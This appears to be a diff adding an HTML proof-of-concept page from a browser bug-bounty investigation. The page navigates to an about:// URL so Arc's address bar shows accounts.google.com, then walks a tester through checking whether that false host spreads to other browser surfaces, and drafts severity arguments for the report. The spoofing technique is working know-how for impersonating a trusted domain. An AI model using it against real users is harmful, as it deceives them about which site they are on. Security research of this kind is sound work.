@@ -1,0 +1,208 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>A2b &mdash; where else does the fake host propagate?</title>
+<style>
+ :root{color-scheme:light}
+ body{font:16px/1.45 -apple-system,system-ui,sans-serif;margin:0;padding:18px 16px 50vh;background:#fff;color:#111}
+ h1{font-size:19px;margin:0 0 4px}
+ h2{font-size:14px;margin:24px 0 4px;text-transform:uppercase;letter-spacing:.04em;color:#555}
+ pre{background:#0b0b0b;color:#8f8;padding:10px;border-radius:8px;font:11.5px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all;margin:8px 0}
+ button{display:block;width:100%;box-sizing:border-box;text-align:left;padding:12px 13px;margin:6px 0;font:13.5px/1.3 -apple-system,system-ui;border:1px solid #ccc;border-radius:11px;background:#f6f6f8;color:#111}
+ .go{background:#1a73e8;border-color:#1a73e8;color:#fff;font-weight:600;text-align:center;font-size:15px;padding:14px}
+ .vuln{border-color:#c00;background:#ffecec}
+ .safe{border-color:#2a7;background:#eefbf4}
+ .skip{border-color:#bbb;background:#f2f2f2;color:#666}
+ .step{border:1px solid #e2e2e2;border-radius:12px;padding:13px;margin:12px 0}
+ .step.hit{border-color:#c00;background:#fff7f7}
+ .step.clear{border-color:#2a7;background:#f6fdf9}
+ .step h3{font-size:14.5px;margin:0 0 4px}
+ .star{color:#c00;font-weight:700}
+ .n{color:#555;font-size:12.5px;line-height:1.5}
+ #tally{position:sticky;top:0;z-index:9;background:#111;color:#fff;margin:0 -16px 14px;padding:11px 16px;font:13px/1.4 -apple-system}
+ #tally b{font-size:16px}
+ #mark{display:none;margin:20px 0;padding:20px;border:3px solid #c00;border-radius:12px}
+ #mark b.hd{display:block;font:800 30px/1.1 -apple-system;color:#c00;letter-spacing:-.5px}
+</style>
+
+<div id="tally">Surfaces carrying the false host: <b id="score">0</b> / 7 &nbsp;<span id="sev"></span></div>
+
+<h1>A2b &mdash; escalation probe</h1>
+<p class="n">A2 proved the address bar prints <b id="brand1"></b> for an <code>about://</code>
+document. That alone is a Low. This page asks the only question that changes the severity:
+<b>does the false host escape the address bar into Arc's other UI?</b> Every surface that
+repeats it is an independent misrepresentation, and Site Settings (step 6) would be the
+serious one.</p>
+
+<p class="n">A fake login form is <b>not</b> possible on this origin &mdash; <code>about</code>
+is in WebKit's <code>builtinSchemesWithUniqueOrigins</code>, so the document has an opaque
+origin and no markup can ever render inside it. Don't try; document the propagation instead.</p>
+
+<pre id="env"></pre>
+
+<div id="mark"><b class="hd">pwned by 33x</b><div id="why" style="margin-top:10px;font-size:13.5px"></div></div>
+
+<h2>Launch</h2>
+<button class="go" id="go">navigate this tab to about://HOST/signin</button>
+<p class="n">Then work down the steps below <b>without leaving that tab</b> where possible.
+Come back here (back gesture) to record each answer.</p>
+
+<div id="steps"></div>
+
+<h2>When done</h2>
+<button class="go" id="fin" style="background:#c00;border-color:#c00">show verdict &amp; report framing</button>
+
+<script>
+(function(){
+ var BRAND = ['accounts','google','com'].join('.');
+ var U = 'about://' + BRAND + '/signin';
+ document.getElementById('brand1').textContent = BRAND;
+
+ document.getElementById('env').textContent =
+  'target      : ' + U + '\n' +
+  'parsed host : ' + (function(){try{return new URL(U).host}catch(e){return '(threw)'}})() + '\n' +
+  'origin      : opaque (about is in builtinSchemesWithUniqueOrigins)\n' +
+  'body        : empty by design -- maybeLoadEmpty() commits about:* as empty text/html\n' +
+  'opener write: will throw SecurityError. That is expected, not a failure.';
+
+ var HITS = {};
+ function recount(){
+   var n = Object.keys(HITS).filter(function(k){return HITS[k]}).length;
+   document.getElementById('score').textContent = n;
+   var s = document.getElementById('sev');
+   s.textContent = n === 0 ? '' :
+                   HITS.sitesettings ? '— permission-scope hit, argue Medium' :
+                   n >= 3 ? '— multi-surface, argue solid Low / weak Medium' :
+                   '— still Low';
+ }
+
+ var STEPS = [
+  { id:'persist', star:0,
+    h:'1 &middot; Persistence',
+    d:'On the blank page: pull to reload, then switch to another tab and back. Does the bar still read the false host?',
+    opts:[
+      {v:1,t:'Yes &mdash; survives reload and tab switch'},
+      {v:0,t:'No &mdash; it reverts to about:blank or this page'}],
+    why:'Persistence proves this is a committed history entry, not a transient pre-commit render. That is exactly what separates it from the already-fixed #3837622, and the triager will ask.'},
+
+  { id:'copylink', star:0,
+    h:'2 &middot; Copy Link',
+    d:'Tap the link icon in the toolbar, then paste into Notes. What did it copy?',
+    opts:[
+      {v:1,t:'a bare <b>https://' + BRAND + '/&hellip;</b> style URL &mdash; scheme rewritten'},
+      {v:1,t:'the host with no scheme, e.g. <b>' + BRAND + '/signin</b>'},
+      {v:0,t:'the honest full string <b>about://' + BRAND + '/signin</b>'},
+      {v:0,t:'nothing / copy was disabled'}],
+    why:'A copied link that reads as a Google URL travels outside the browser. The victim can paste it into chat and vouch for it.'},
+
+  { id:'share', star:0,
+    h:'3 &middot; Share sheet',
+    d:'Tap Share. What does the sheet header / preview show, and what gets shared?',
+    opts:[
+      {v:1,t:'shows <b>' + BRAND + '</b> as the source/site'},
+      {v:0,t:'shows the full about:// string'},
+      {v:0,t:'Share is unavailable on this page'}],
+    why:'The share sheet is a second trusted surface repeating the false origin, and it is the one that reaches other people.'},
+
+  { id:'pin', star:0,
+    h:'4 &middot; Pin the tab',
+    d:'Tap Pin. What label does the pinned entry get?',
+    opts:[
+      {v:1,t:'pinned as <b>' + BRAND + '</b>'},
+      {v:0,t:'pinned with the about:// string or a blank/placeholder label'},
+      {v:0,t:'Pin refused this page'}],
+    why:'A pinned tab is persistent UI the victim sees every session, long after the attack page is closed.'},
+
+  { id:'switcher', star:0,
+    h:'5 &middot; Tab switcher card',
+    d:'Open the tab switcher. What does this tab card say?',
+    opts:[
+      {v:1,t:'card reads <b>' + BRAND + '</b>'},
+      {v:0,t:'card shows the about:// string or just the title'}],
+    why:'Third independent surface. Cheap to check, adds a line to the report.'},
+
+  { id:'sitesettings', star:1,
+    h:'6 &middot; Site Settings &nbsp;<span class="star">&#9733; highest value</span>',
+    d:'Open the menu &rarr; Site Settings. <b>Which site is it scoped to?</b> If it names the false host, check whether it offers permission toggles (location, camera, mic, notifications).',
+    opts:[
+      {v:1,t:'scoped to <b>' + BRAND + '</b> <b>and</b> offers permission toggles'},
+      {v:1,t:'scoped to <b>' + BRAND + '</b>, display only, no toggles'},
+      {v:0,t:'scoped to about:// or shows no site / is unavailable'}],
+    why:'THE escalation. If Site Settings binds to the false host, a permission decision the user makes here is scoped to a domain they were shown but never visited. If it also writes a real permission grant for accounts.google.com, this stops being cosmetic and becomes a permission-scope confusion bug -- report that as its own finding, above Low.'},
+
+  { id:'history', star:0,
+    h:'7 &middot; History',
+    d:'Open history. How is the visit recorded?',
+    opts:[
+      {v:1,t:'recorded as <b>' + BRAND + '</b>'},
+      {v:0,t:'recorded as the about:// string, or not recorded'}],
+    why:'Persistent record naming a domain never visited. Also means autocomplete may later suggest it.'}
+ ];
+
+ var box = document.getElementById('steps');
+ STEPS.forEach(function(s){
+   var d = document.createElement('div');
+   d.className = 'step'; d.id = 'step-' + s.id;
+   var html = '<h3>' + s.h + '</h3><p class="n">' + s.d + '</p>';
+   d.innerHTML = html;
+   s.opts.forEach(function(o){
+     var b = document.createElement('button');
+     b.className = o.v ? 'vuln' : 'safe';
+     b.innerHTML = o.t;
+     b.onclick = function(){
+       HITS[s.id] = !!o.v;
+       d.className = 'step ' + (o.v ? 'hit' : 'clear');
+       Array.prototype.forEach.call(d.querySelectorAll('button'), function(x){ x.style.opacity = '.45'; });
+       b.style.opacity = '1';
+       recount();
+     };
+     d.appendChild(b);
+   });
+   var sk = document.createElement('button');
+   sk.className = 'skip'; sk.textContent = 'skip / not applicable';
+   sk.onclick = function(){ HITS[s.id] = false; d.className = 'step'; recount(); };
+   d.appendChild(sk);
+   box.appendChild(d);
+ });
+
+ document.getElementById('go').onclick = function(){
+   try { sessionStorage.setItem('a2b','1'); } catch(e){}
+   location.href = U;
+ };
+
+ document.getElementById('fin').onclick = function(){
+   var hit = Object.keys(HITS).filter(function(k){ return HITS[k]; });
+   var m = document.getElementById('mark');
+   var w = document.getElementById('why');
+   if (!hit.length) {
+     m.style.display = 'block';
+     m.style.borderColor = '#2a7';
+     m.querySelector('.hd').textContent = 'contained';
+     m.querySelector('.hd').style.color = '#2a7';
+     w.innerHTML = 'The false host stayed inside the address bar. A2 is a clean <b>Low</b> ' +
+       'on its own &mdash; file it as drafted, concede the Not Secure prefix and the blank body, ' +
+       'and cite CVE-2024-26283 as the fix template. Do not inflate it.';
+   } else {
+     m.style.display = 'block';
+     m.querySelector('.hd').textContent = 'pwned by 33x';
+     var extra = HITS.sitesettings
+       ? '<br><br><b>Site Settings carried it.</b> Split that into a second report: ' +
+         'permission scope bound to a domain the user never visited. That one is not Low. ' +
+         'Screenshot the Site Settings pane showing the false host, and if there are toggles, ' +
+         'grant one and then check whether the grant appears against the real domain in global settings.'
+       : '';
+     w.innerHTML = 'The false host propagated to <b>' + hit.length + '</b> surface(s) beyond the ' +
+       'address bar: <b>' + hit.join(', ') + '</b>.<br><br>Each one is an independent ' +
+       'misrepresentation and belongs in the report as its own numbered observation with its own ' +
+       'screenshot &mdash; a triager who dismisses the bar alone still has to answer for the rest.' +
+       extra +
+       '<br><br><b style="font:600 13px -apple-system;color:#111">Screenshot this box together with each surface you ticked.</b>' +
+       '<br><span style="font:11.5px ui-monospace;color:#555">' + new Date().toISOString() + '</span>';
+   }
+   m.scrollIntoView({block:'center'});
+ };
+
+ try { if (sessionStorage.getItem('a2b')) { sessionStorage.removeItem('a2b'); box.scrollIntoView({block:'start'}); } } catch(e){}
+ recount();
+})();
+</script>
